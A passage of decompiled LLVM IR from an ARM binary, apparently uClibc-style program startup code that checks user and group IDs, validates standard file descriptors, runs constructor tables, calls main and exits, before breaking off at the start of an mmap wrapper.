  br i1 %v3_14cac, label %dec_label_pc_14cb8, label %dec_label_pc_14ce0

dec_label_pc_14cb8:                               ; preds = %bb82
  %v0_14cb8 = call i32 @getuid()
  store i32 %v0_14cb8, i32* @r0, align 4
  store i32 %v0_14cb8, i32* %r4.global-to-local, align 4
  %v0_14cc0 = call i32 @geteuid()
  store i32 %v0_14cc0, i32* @r0, align 4
  %v3_14cc4 = icmp uge i32 %v0_14cb8, %v0_14cc0
  store i1 %v3_14cc4, i1* %cpsr_c.global-to-local, align 1
  %v9_14cc4 = icmp eq i32 %v0_14cb8, %v0_14cc0
  store i1 %v9_14cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14cc4, label %dec_label_pc_14ccc, label %dec_label_pc_14d08

dec_label_pc_14ccc:                               ; preds = %dec_label_pc_14cb8
  %v1_14ccc = call i32 @getgid(i32 %v0_14cc0)
  store i32 %v1_14ccc, i32* @r0, align 4
  store i32 %v1_14ccc, i32* %r4.global-to-local, align 4
  %v0_14cd4 = call i32 @getegid()
  store i32 %v0_14cd4, i32* %r0.global-to-local, align 4
  %v3_14cd8 = icmp uge i32 %v1_14ccc, %v0_14cd4
  store i1 %v3_14cd8, i1* %cpsr_c.global-to-local, align 1
  %v9_14cd8 = icmp eq i32 %v1_14ccc, %v0_14cd4
  store i1 %v9_14cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14cd8, label %dec_label_pc_14ce0, label %dec_label_pc_14d08

dec_label_pc_14ce0:                               ; preds = %dec_label_pc_14ccc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_14cac, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_14cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14cac, label %dec_label_pc_14d30, label %dec_label_pc_14cec

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14ce0
  store i32 %tmp64, i32* @r3, align 4
  %v3_14cf0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14cf0, i1* %cpsr_c.global-to-local, align 1
  %v9_14cf0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14cf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14cf0, label %dec_label_pc_14cf8, label %dec_label_pc_14d08

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cec
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14d00 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14d00, i1* %cpsr_c.global-to-local, align 1
  %v9_14d00 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14d00, label %dec_label_pc_14d30, label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cec, %dec_label_pc_14ccc, %dec_label_pc_14cb8, %dec_label_pc_14cf8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14d14 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_14d1c = load i32, i32* @r4, align 4
  store i32 %v0_14d1c, i32* %r1.global-to-local, align 4
  %v2_14d20 = call i32 @__check_one_fd(i32 1, i32 %v0_14d1c)
  %v0_14d24 = load i32, i32* @r4, align 4
  store i32 %v0_14d24, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_14d2c = call i32 @__check_one_fd(i32 2, i32 %v0_14d24)
  store i32 %v2_14d2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14cf8, %dec_label_pc_14ce0, %dec_label_pc_14d08
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_14d38 = load i32, i32* %arg3, align 4
  store i32 %v2_14d38, i32* %r2.global-to-local, align 4
  %v2_14d3c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14d3c, i32* %r1.global-to-local, align 4
  %v3_14d40 = add i32 %v2_14d3c, 260
  %v4_14d40 = inttoptr i32 %v3_14d40 to i32*
  store i32 %v2_14d38, i32* %v4_14d40, align 4
  %v0_14d44 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d44 = inttoptr i32 %v0_14d44 to i32*
  %v2_14d44 = load i32, i32* %v1_14d44, align 4
  store i32 %v2_14d44, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d48 = icmp eq i32 %v2_14d44, 0
  store i1 %v2_14d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d48, label %bb84, label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14d30
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_14d54 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d54 = add i32 %v0_14d54, 164
  %v3_14d54 = inttoptr i32 %v2_14d54 to i32*
  %v4_14d54 = load i32, i32* %v3_14d54, align 4
  store i32 %v4_14d54, i32* %r3.global-to-local, align 4
  %v2_14d58 = inttoptr i32 %v4_14d54 to i32*
  store i32 %v2_14d44, i32* %v2_14d58, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_14d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d60 = inttoptr i32 %v0_14d60 to i32*
  %v2_14d60 = load i32, i32* %v1_14d60, align 4
  store i32 %v2_14d60, i32* %r0.global-to-local, align 4
  %v4_14d64 = call i32 @__GI_strrchr(i32 %v2_14d60, i32 47, i32 %v2_14d38, i32 %v4_14d54)
  store i32 %v4_14d64, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_14d6c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14d6c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d70 = icmp eq i32 %v4_14d64, 0
  store i1 %v2_14d70, i1* %cpsr_z.global-to-local, align 1
  %v2_14d74 = add i32 %v2_14d6c, 96
  %v3_14d74 = inttoptr i32 %v2_14d74 to i32*
  %v4_14d74 = load i32, i32* %v3_14d74, align 4
  store i32 %v4_14d74, i32* %r2.global-to-local, align 4
  br i1 %v2_14d70, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_14d50
  %v2_14d7c58 = inttoptr i32 %v4_14d74 to i32*
  store i32 0, i32* %v2_14d7c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_14d50
  %v2_14d78 = add i32 %v4_14d64, 1
  store i32 %v2_14d78, i32* %r3.global-to-local, align 4
  %v2_14d7c = inttoptr i32 %v4_14d74 to i32*
  store i32 %v4_14d64, i32* %v2_14d7c, align 4
  %v1_14d80 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d80 = load i32, i32* %r2.global-to-local, align 4
  %v3_14d80 = inttoptr i32 %v2_14d80 to i32*
  store i32 %v1_14d80, i32* %v3_14d80, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_14d30
  %v2_14d90 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14d90, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14d9c = add i32 %v2_14d90, -12
  store i32 %v2_14d9c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14dac = add i32 %v2_14d90, 2004
  %v4_14dac = inttoptr i32 %v3_14dac to i32*
  store i32 %arg5, i32* %v4_14dac, align 4
  %v0_14dc418 = load i32, i32* %r4.global-to-local, align 4
  %v1_14dc419 = load i32, i32* %r7.global-to-local, align 4
  %v3_14dc421 = icmp uge i32 %v0_14dc418, %v1_14dc419
  store i1 %v3_14dc421, i1* %cpsr_c.global-to-local, align 1
  %v9_14dc427 = icmp eq i32 %v0_14dc418, %v1_14dc419
  store i1 %v9_14dc427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14dc421, label %dec_label_pc_14df8.lr.ph, label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %bb84, %dec_label_pc_14db4
  %v1_14db4 = phi i32 [ %v1_14dc0, %dec_label_pc_14db4 ], [ %v0_14dc418, %bb84 ]
  %v0_14db4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14db4 = and i32 %v1_14db4, 1073741824
  %v3_14db4 = icmp ne i32 %v2_14db4, 0
  store i1 %v3_14db4, i1* %cpsr_c.global-to-local, align 1
  %v4_14db4 = mul i32 %v1_14db4, 4
  %v5_14db4 = add i32 %v4_14db4, %v0_14db4
  %v6_14db4 = inttoptr i32 %v5_14db4 to i32*
  %v7_14db4 = load i32, i32* %v6_14db4, align 4
  store i32 %v7_14db4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14db4)
  %v0_14dc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14dc0 = add i32 %v0_14dc0, 1
  store i32 %v1_14dc0, i32* %r4.global-to-local, align 4
  %v1_14dc4 = load i32, i32* %r7.global-to-local, align 4
  %v3_14dc4 = icmp uge i32 %v1_14dc0, %v1_14dc4
  store i1 %v3_14dc4, i1* %cpsr_c.global-to-local, align 1
  %v9_14dc4 = icmp eq i32 %v1_14dc0, %v1_14dc4
  store i1 %v9_14dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14dc4, label %dec_label_pc_14df8.lr.ph, label %dec_label_pc_14db4

dec_label_pc_14df8.lr.ph:                         ; preds = %dec_label_pc_14db4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14dcc = icmp eq i32 %v0_14c18, 0
  store i1 %v2_14dcc, i1* %cpsr_z.global-to-local, align 1
  %v2_14dd4 = xor i1 %v2_14dcc, true
  call void @__pseudo_cond_branch(i1 %v2_14dd4, i32 %v0_14c18)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14de0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_14dec = add i32 %v2_14de0, -12
  store i32 %v2_14dec, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14df8

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14df8.dec_label_pc_14df8_crit_edge, %dec_label_pc_14df8.lr.ph
  %v1_14df8 = phi i32 [ %v1_14e04, %dec_label_pc_14df8.dec_label_pc_14df8_crit_edge ], [ 0, %dec_label_pc_14df8.lr.ph ]
  %v0_14df8 = phi i32 [ %v0_14df8.pre, %dec_label_pc_14df8.dec_label_pc_14df8_crit_edge ], [ %v2_14dec, %dec_label_pc_14df8.lr.ph ]
  %v2_14df8 = and i32 %v1_14df8, 1073741824
  %v3_14df8 = icmp ne i32 %v2_14df8, 0
  store i1 %v3_14df8, i1* %cpsr_c.global-to-local, align 1
  %v4_14df8 = mul i32 %v1_14df8, 4
  %v5_14df8 = add i32 %v4_14df8, %v0_14df8
  %v6_14df8 = inttoptr i32 %v5_14df8 to i32*
  %v7_14df8 = load i32, i32* %v6_14df8, align 4
  store i32 %v7_14df8, i32* %ip.global-to-local, align 4
  store i32 85508, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14df8)
  %v0_14e04 = load i32, i32* @r4, align 4
  %v1_14e04 = add i32 %v0_14e04, 1
  store i32 %v1_14e04, i32* @r4, align 4
  %v1_14e08 = load i32, i32* @r7, align 4
  %v3_14e08 = icmp uge i32 %v1_14e04, %v1_14e08
  store i1 %v3_14e08, i1* %cpsr_c.global-to-local, align 1
  %v9_14e08 = icmp eq i32 %v1_14e04, %v1_14e08
  store i1 %v9_14e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14e08, label %dec_label_pc_14e10, label %dec_label_pc_14df8.dec_label_pc_14df8_crit_edge

dec_label_pc_14df8.dec_label_pc_14df8_crit_edge:  ; preds = %dec_label_pc_14df8
  %v0_14df8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14df8

dec_label_pc_14e10:                               ; preds = %dec_label_pc_14df8
  %v2_14e14.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14e14.pre, i32* %r0.global-to-local, align 4
  %v2_14e18 = add i32 %v2_14e14.pre, -67460
  store i32 %v2_14e18, i32* %r2.global-to-local, align 4
  store i32 %v2_14e18, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e20 = icmp eq i32 %v2_14e18, 0
  store i1 %v2_14e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e20, label %dec_label_pc_14e38, label %dec_label_pc_14e28

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e10
  store i32 85552, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_14e18)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14e34 = load i32, i32* %r0.global-to-local, align 4
  %v2_14e34 = inttoptr i32 %v1_14e34 to i32*
  store i32 0, i32* %v2_14e34, align 4
  %v2_14e3c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e10, %dec_label_pc_14e28
  %v2_14e3c = phi i32 [ %v2_14e14.pre, %dec_label_pc_14e10 ], [ %v2_14e3c.pre, %dec_label_pc_14e28 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_14e3c, i32* %r1.global-to-local, align 4
  %v2_14e40 = add i32 %v2_14e3c, 128
  %v3_14e40 = inttoptr i32 %v2_14e40 to i32*
  %v4_14e40 = load i32, i32* %v3_14e40, align 4
  store i32 %v4_14e40, i32* %r2.global-to-local, align 4
  store i32 %v4_14e40, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e48 = icmp eq i32 %v4_14e40, 0
  store i1 %v2_14e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e48, label %dec_label_pc_14e60, label %dec_label_pc_14e50

dec_label_pc_14e50:                               ; preds = %dec_label_pc_14e38
  store i32 85592, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14e40)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14e5c = load i32, i32* %r0.global-to-local, align 4
  %v2_14e5c = inttoptr i32 %v1_14e5c to i32*
  store i32 0, i32* %v2_14e5c, align 4
  br label %dec_label_pc_14e60

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e38, %dec_label_pc_14e50
  %v2_14e60 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_14e60, i32* @r0, align 4
  %v1_14e64 = call i32 @_setjmp(i32 %v2_14e60)
  store i32 %v1_14e64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e68 = icmp eq i32 %v1_14e64, 0
  store i1 %v2_14e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e68, label %dec_label_pc_14e70, label %dec_label_pc_14ebc

dec_label_pc_14e70:                               ; preds = %dec_label_pc_14e60
  %v0_14e70 = call i32 @__aeabi_read_tp()
  store i32 %v0_14e70, i32* %r0.global-to-local, align 4
  %v1_14e74 = add i32 %v0_14e70, -1168
  store i32 %v1_14e74, i32* %r2.global-to-local, align 4
  %v2_14e7c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14e7c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14e88 = add i32 %v2_14e7c, 56
  %v3_14e88 = inttoptr i32 %v2_14e88 to i32*
  %v4_14e88 = load i32, i32* %v3_14e88, align 4
  store i32 %v4_14e88, i32* %ip.global-to-local, align 4
  store i32 %v2_14e60, i32* %r3.global-to-local, align 4
  %v2_14e98 = add i32 %v0_14e70, -1040
  %v3_14e98 = inttoptr i32 %v2_14e98 to i32*
  store i32 %v2_14e60, i32* %v3_14e98, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14ea4 = load i32, i32* %ip.global-to-local, align 4
  %v1_14ea4 = inttoptr i32 %v0_14ea4 to i32*
  %v2_14ea4 = load i32, i32* %v1_14ea4, align 4
  store i32 %v2_14ea4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14eb4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f58

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14e60
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14ec0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14ec0, i32* %ip.global-to-local, align 4
  %v2_14ec4 = add i32 %v2_14ec0, 40
  %v3_14ec4 = inttoptr i32 %v2_14ec4 to i32*
  %v4_14ec4 = load i32, i32* %v3_14ec4, align 4
  store i32 %v4_14ec4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14ec4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14ed4 = load i32, i32* %stack_var_-416, align 4
  %v2_14ed8 = add i32 %v2_14ed4, 120
  %v3_14ed8 = inttoptr i32 %v2_14ed8 to i32*
  %v4_14ed8 = load i32, i32* %v3_14ed8, align 4
  store i32 %v4_14ed8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14edc

dec_label_pc_14edc:                               ; preds = %dec_label_pc_14f10.dec_label_pc_14edc_crit_edge, %dec_label_pc_14ebc
  %v0_14edc = phi i32 [ %v0_14edc.pre, %dec_label_pc_14f10.dec_label_pc_14edc_crit_edge ], [ %v4_14ed8, %dec_label_pc_14ebc ]
  %v1_14edc = inttoptr i32 %v0_14edc to i32*
  %v2_14edc = load i32, i32* %v1_14edc, align 4
  store i32 %v0_14edc, i32* %r2.global-to-local, align 4
  store i32 %v2_14edc, i32* %r4.global-to-local, align 4
  %v1_14ee8 = add i32 %v2_14edc, -1
  store i32 %v1_14ee8, i32* %r1.global-to-local, align 4
  %v2_14eec89 = load i32, i32* %v1_14edc, align 4
  store i32 %v2_14eec89, i32* %r3.global-to-local, align 4
  %v3_14ef091 = icmp uge i32 %v2_14eec89, %v2_14edc
  store i1 %v3_14ef091, i1* %cpsr_c.global-to-local, align 1
  %v9_14ef097 = icmp eq i32 %v2_14eec89, %v2_14edc
  store i1 %v9_14ef097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14ef097, label %dec_label_pc_14ef8, label %dec_label_pc_14f10

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14edc, %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge
  %v0_14ef898 = phi i32 [ %v1_14ef0.pre, %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge ], [ %v2_14edc, %dec_label_pc_14edc ]
  store i32 %v0_14ef898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14f08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14f08, label %dec_label_pc_14f0c, label %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge

dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge:  ; preds = %dec_label_pc_14ef8
  %v0_14eec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ef0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14eec = inttoptr i32 %v0_14eec.pre to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %r3.global-to-local, align 4
  %v3_14ef0 = icmp uge i32 %v2_14eec, %v1_14ef0.pre
  store i1 %v3_14ef0, i1* %cpsr_c.global-to-local, align 1
  %v9_14ef0 = icmp eq i32 %v2_14eec, %v1_14ef0.pre
  store i1 %v9_14ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14ef0, label %dec_label_pc_14ef8, label %dec_label_pc_14f10

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14ef8
  %v0_14f0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14f0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f10

dec_label_pc_14f10:                               ; preds = %dec_label_pc_14edc, %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge, %dec_label_pc_14f0c
  %v0_14f18 = phi i32 [ %v0_14f0c, %dec_label_pc_14f0c ], [ %v2_14eec89, %dec_label_pc_14edc ], [ %v2_14eec, %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge ]
  %v1_14f10 = phi i32 [ %v0_14f0c, %dec_label_pc_14f0c ], [ %v2_14edc, %dec_label_pc_14edc ], [ %v1_14ef0.pre, %dec_label_pc_14ef8.dec_label_pc_14eec_crit_edge ]
  %v3_14f10 = icmp uge i32 %v0_14f18, %v1_14f10
  store i1 %v3_14f10, i1* %cpsr_c.global-to-local, align 1
  %v9_14f10 = icmp eq i32 %v0_14f18, %v1_14f10
  store i1 %v9_14f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14f10, label %dec_label_pc_14f18, label %dec_label_pc_14f10.dec_label_pc_14edc_crit_edge

dec_label_pc_14f10.dec_label_pc_14edc_crit_edge:  ; preds = %dec_label_pc_14f10
  %v0_14edc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14edc

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f10
  %v2_14f18 = icmp ne i32 %v1_14f10, 0
  store i1 %v2_14f18, i1* %cpsr_c.global-to-local, align 1
  %v7_14f18 = icmp eq i32 %v1_14f10, 1
  store i1 %v7_14f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14f18, label %dec_label_pc_14f58, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f18
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f58

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f18, %dec_label_pc_14f20, %dec_label_pc_14e70
  %storemerge2 = phi i32 [ %v0_14eb4, %dec_label_pc_14e70 ], [ 0, %dec_label_pc_14f20 ], [ 0, %dec_label_pc_14f18 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_14f5c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_14f5c, i32* %r0.global-to-local, align 4
  %v0_14f60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f60, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_14f58
  %v3_14f60 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f64 = load i32, i32* @r8, align 4
  %v8_14f64 = shl i32 %v2_14f64, %v1_14f5c
  %v9_14f64 = and i32 %v8_14f64, %v1_14f5c
  %v8_14f68 = lshr i32 %v2_14f64, %v9_14f64
  %v9_14f68 = and i32 %v8_14f68, %v9_14f64
  %v2_14f6c = inttoptr i32 %v9_14f68 to i64*
  %v3_14f6c = load i64, i64* %v2_14f6c, align 4
  %v5_14f6c = trunc i64 %v3_14f6c to i32
  %v6_14f6c = udiv i64 %v3_14f6c, 4294967296
  %v7_14f6c = trunc i64 %v6_14f6c to i32
  store i32 %v5_14f6c, i32* %r1.global-to-local, align 4
  %v9_14f6c = sub i32 %v7_14f6c, %v2_14f64
  %v3_14f70 = mul i32 %v9_14f6c, %v3_14f60
  %v5_14f78 = mul i32 %v3_14f60, 4
  %v5_14f7c = udiv i32 %v3_14f60, 2
  %v6_14f78 = and i32 %v5_14f7c, %v5_14f78
  %v6_14f7c = and i32 %v6_14f78, %v3_14f70
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_14f7c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14f58, %bb85
  %v5_14f80 = phi i32 [ %v1_14f5c, %dec_label_pc_14f58 ], [ %v6_14f7c, %bb85 ]
  ret i32 %v5_14f80

; uselistorder directives
  uselistorder i32 %v3_14f60, { 1, 0, 2 }
  uselistorder i32 %v1_14f5c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14f10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14f0c, { 1, 0, 2 }
  uselistorder i32 %v1_14ef0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14edc, { 1, 0 }
  uselistorder i32 %v2_14e3c, { 1, 0 }
  uselistorder i32 %v2_14e14.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14e08, { 1, 0 }
  uselistorder i32 %v1_14e04, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14df8, { 1, 0 }
  uselistorder i32 %v1_14dc4, { 1, 0 }
  uselistorder i32 %v1_14dc0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14db4, { 1, 0 }
  uselistorder i32 %v2_14d90, { 1, 0, 2 }
  uselistorder i32 %v4_14d74, { 1, 0, 2 }
  uselistorder i32 %v4_14d64, { 1, 0, 2, 3 }
  uselistorder i1 %v8_14cac, { 1, 2, 0 }
  uselistorder i32 %v2_14c78, { 1, 2, 0 }
  uselistorder i32 %v1_14c74, { 1, 2, 0 }
  uselistorder i1 %v2_14c60, { 1, 0, 2 }
  uselistorder i32 %v5_14c64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14c30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14c18, { 1, 0, 2 }
  uselistorder i32 %v2_14c0c, { 1, 0, 2 }
  uselistorder i32 %v3_14bdc, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 3, 1, 2, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_14f58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14f10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ef8, { 1, 0 }
  uselistorder label %dec_label_pc_14e60, { 1, 0 }
  uselistorder label %dec_label_pc_14e38, { 1, 0 }
  uselistorder label %dec_label_pc_14db4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d08, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_14c78, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_14c60, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14fac = load i32, i32* @r4, align 4
